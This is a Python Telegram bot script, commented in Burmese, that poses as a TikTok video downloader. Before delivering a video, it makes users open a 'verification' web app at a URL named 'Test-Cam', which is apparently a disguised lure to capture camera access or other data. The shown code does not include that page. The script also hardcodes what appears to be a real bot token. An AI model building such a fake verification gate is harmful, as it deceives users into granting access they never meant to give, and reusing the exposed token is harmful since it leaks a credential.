import telebot
import requests
from telebot import types

# --- ပြင်ဆင်ရန် အပိုင်း ---
# @BotFather ကရတဲ့ Token ကို သေချာပြန်ထည့်ပါ
BOT_TOKEN = "8699185806:AAHioOhJMq-0nO_uYycVkbV4c_xNm_Xd3xY"
WEB_APP_URL = "https://tar-alt.github.io/Test-Cam/" 
# -----------------------

bot = telebot.TeleBot(BOT_TOKEN)

# ဗီဒီယို Link များကို ခေတ္တသိမ်းဆည်းရန်
pending_videos = {}

@bot.message_handler(commands=['start'])
def send_welcome(message):
    welcome_text = (
        "🌟 *Ultra HD TikTok Downloader*\n\n"
        "TikTok Link ပို့ပေးရုံနဲ့ ဗီဒီယိုတွေကို ဒေါင်းလုဒ်ဆွဲနိုင်ပါပြီ။"
    )
    bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown")

@bot.message_handler(func=lambda message: "tiktok.com" in message.text)
def handle_tiktok(message):
    user_id = message.chat.id
    url = message.text
    pending_videos[user_id] = url
    
    markup = types.InlineKeyboardMarkup()
    web_app = types.WebAppInfo(url=WEB_APP_URL)
    verify_btn = types.InlineKeyboardButton(text="ဗီဒီယိုဒေါင်းရန် Verification လုပ်ပါ 🔓", web_app=web_app)
    markup.add(verify_btn)
    
    verify_text = (
        "⚠️ *Verification Required*\n\n"
        "ဗီဒီယိုကို ပြင်ဆင်နေပါပြီ။ လူဟုတ်မဟုတ် အရင်စစ်ဆေးပေးပါ။\n"
        "အောက်ကခလုတ်ကိုနှိပ်ပြီး Continue လုပ်ပေးပါ။"
    )
    bot.reply_to(message, verify_text, reply_markup=markup, parse_mode="Markdown")

# Website ကနေ အချက်အလက်ပို့လာရင် ဖမ်းယူမယ့်အပိုင်း
@bot.message_handler(func=lambda message: message.text == "✅ Verification_Success")
def process_download(message):
    user_id = message.chat.id
    if user_id in pending_videos:
        url = pending_videos[user_id]
        status_msg = bot.send_message(user_id, "🚀 Verification အောင်မြင်ပါသည်။ ဗီဒီယိုကို ပို့ပေးနေပါပြီ...")
        
        try:
            # TikTok API ချိတ်ဆက်ခြင်း
            api_url = f"https://www.tikwm.com/api/?url={url}&hd=1"
            res = requests.get(api_url).json()
            if res.get('code') == 0:
                video_url = res['data'].get('play') 
                bot.send_video(
                    user_id, 
                    video_url, 
                    caption="✅ *ဒေါင်းလုဒ် အောင်မြင်ပါပြီ!*\n\nCreated by: [Taro](https://t.me/Yes_is_me_Taro)", 
                    parse_mode="Markdown"
                )
                bot.delete_message(user_id, status_msg.message_id)
            else:
                bot.edit_message_text("❌ Link မှားနေပါသည်။", user_id, status_msg.message_id)
        except:
            bot.edit_message_text("⚠️ စနစ်ချို့ယွင်းချက် ရှိနေပါသည်။", user_id, status_msg.message_id)
        
        del pending_videos[user_id]

# Error မတက်အောင် polling ကို သေချာထားပါ
bot.infinity_polling()
